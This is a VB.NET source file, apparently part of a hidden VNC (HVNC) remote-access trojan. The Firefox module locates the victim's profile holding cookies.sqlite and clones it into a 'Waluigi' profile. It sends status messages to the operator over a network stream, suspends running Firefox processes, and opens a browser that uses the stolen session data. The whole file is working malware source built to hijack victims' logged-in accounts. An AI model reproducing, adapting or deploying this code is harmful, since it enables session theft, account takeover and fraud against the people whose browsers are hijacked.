Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports DLL.Functions
Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.Windows.Forms
Imports System.Drawing
Imports System.Runtime.InteropServices

Namespace DLL.Browser
	Public Class Firefox

		<DllImport("user32.dll", EntryPoint:="SetWindowPos")>
		Public Shared Function SetWindowPos(ByVal hWnd As IntPtr, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal Y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As IntPtr
		End Function

		Private Const SWP_NOMOVE As Short = &H2
		Private Const SWP_NOSIZE As Short = 1
		Private Const SWP_NOZORDER As Short = &H4
		Private Const SWP_SHOWWINDOW As Integer = &H40

		Public Shared Sub StartFirefox(ByVal duplicate As Boolean)
			Try
				If Conversions.ToBoolean(Outils.IsFileOpen(New FileInfo(Interaction.Environ("appdata") & "\Mozilla\Firefox\Profiles\Waluigi\parent.lock"))) Then
					Outils.SendInformation(Outils.nstream, "25|Firefox has already been opened!")
					Return
				End If
				Dim path As String = Interaction.Environ("appdata") & "\Mozilla\Firefox\Profiles"
				Dim text As String = String.Empty
				If Not Directory.Exists(path) Then
					Return
				End If
				Dim directories() As String = Directory.GetDirectories(path)
				For Each text2 As String In directories
					Dim path2 As String = text2 & "\cookies.sqlite"
					If File.Exists(path2) Then
						text = System.IO.Path.GetFileName(text2)
						Exit For
					End If
				Next text2
				If duplicate Then
					Outils.SendInformation(Outils.nstream, "22|" & Conversions.ToString(Math.Round(CDbl((New GetDirSize()).GetDirSizez(Interaction.Environ("appdata") & "\Mozilla\Firefox\Profiles\" & text)) / 1024.0 / 1024.0)))
					Dim monitorDirSize As New MonitorDirSize()
					monitorDirSize.StartMonitoring(Interaction.Environ("appdata") & "\Mozilla\Firefox\Profiles\Waluigi")
					Try
						Outils.a.FileSystem.CopyDirectory(Interaction.Environ("appdata") & "\Mozilla\Firefox\Profiles\" & text, Interaction.Environ("appdata") & "\Mozilla\Firefox\Profiles\Waluigi", overwrite:=True)
					Catch projectError As Exception
						ProjectData.SetProjectError(projectError)
						ProjectData.ClearProjectError()
					End Try
					monitorDirSize.StopMonitoring()
					Outils.SendInformation(Outils.nstream, "202|" & Conversions.ToString(Math.Round(CDbl((New GetDirSize()).GetDirSizez(Interaction.Environ("appdata") & "\Mozilla\Firefox\Profiles\" & text)) / 1024.0 / 1024.0)))
				Else
					Outils.SendInformation(Outils.nstream, "203|" & Conversions.ToString(Math.Round(CDbl((New GetDirSize()).GetDirSizez(Interaction.Environ("appdata") & "\Mozilla\Firefox\Profiles\" & text)) / 1024.0 / 1024.0)))

				End If
				Dim processesByName() As Process = Process.GetProcessesByName("firefox")
				For Each process As Process In processesByName
					Outils.SuspendProcess(process)
				Next process
				Process.Start("firefox", "-new-window ""data:text/html,<center><title>Welcome to HVNC !</title><br><br><img src='https://i.imgur.com/A6jEbUB.png'><br><h1><font color='white'>Welcome to HVNC !</font></h1></center>"" -safe-mode -no-remote -profile """ & Interaction.Environ("appdata") & "\Mozilla\Firefox\Profiles\Waluigi""")
				Dim stopwatch As Stopwatch = New Stopwatch()
				stopwatch.Start()
				Dim intPtr As IntPtr = IntPtr.Zero

				While intPtr = IntPtr.Zero
					Dim secondMonitor As Rectangle = Screen.AllScreens(0).WorkingArea
					SetWindowPos(Outils.FindHandle("Firefox Safe Mode"), 0, secondMonitor.Left, secondMonitor.Top, secondMonitor.Width, secondMonitor.Height, SWP_NOZORDER Or SWP_SHOWWINDOW)
					intPtr = Outils.FindHandle("Firefox Safe Mode")

					If stopwatch.ElapsedMilliseconds >= 5000 Then
						Exit While
					End If
				End While

				stopwatch.[Stop]()
				Outils.PostMessage(intPtr, 256UI, CType(13, IntPtr), CType(1, IntPtr))
				Dim stopwatch2 As Stopwatch = New Stopwatch()
				stopwatch2.Start()

				While Outils.FindHandle("Welcome to HVNC !") = Nothing
					Dim secondMonitor As Rectangle = Screen.AllScreens(0).WorkingArea
					SetWindowPos(Outils.FindHandle("Welcome to HVNC !"), 0, secondMonitor.Left, secondMonitor.Top, secondMonitor.Width, secondMonitor.Height, SWP_NOZORDER Or SWP_SHOWWINDOW)
					Application.DoEvents()

					If stopwatch2.ElapsedMilliseconds >= 5000 Then
						Dim processesByName2 As Process() = Process.GetProcessesByName("firefox")

						For Each process2 As Process In processesByName2
							Outils.ResumeProcess(process2)
						Next

						Exit While
					End If
				End While

				stopwatch2.[Stop]()
				Dim processesByName3 As Process() = Process.GetProcessesByName("firefox")

				For Each process3 As Process In processesByName3
					Outils.ResumeProcess(process3)
				Next

			Catch projectError2 As Exception
				ProjectData.SetProjectError(projectError2)
				ProjectData.ClearProjectError()
			End Try
		End Sub
	End Class
End Namespace